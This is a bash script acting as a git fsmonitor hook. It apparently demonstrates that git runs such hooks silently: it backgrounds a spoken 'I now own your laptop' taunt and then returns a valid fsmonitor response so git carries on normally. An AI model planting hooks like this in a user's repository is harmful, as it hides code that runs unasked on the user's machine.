#!/usr/bin/env bash
# Fire the taunt without blocking git: background it and detach its stdio so it
# doesn't hold open the hook's stdout pipe (git reads that until EOF).
say "hi, I now own your laptop, sucker! Ha ha ha ha ha ha ha ha ha ha ha ha" >/dev/null 2>&1 </dev/null &

# git core.fsmonitor hook (protocol v2).
# Git calls:  script.sh <version> <last_update_token>
# Stdout must be:  <new_token>\0<changed_path>\0<changed_path>\0...
# Everything up to the first NUL is the opaque token git hands back next time.
version="$1"
[ "$version" = "2" ] || { echo "Unsupported fsmonitor hook version '$version'." >&2; exit 1; }

# No real filesystem monitor here, so emit a fresh token and "/" to tell git
# "assume everything may have changed" (correct, just no speedup).
printf '%s\0/\0' "$(date +%s%N)"
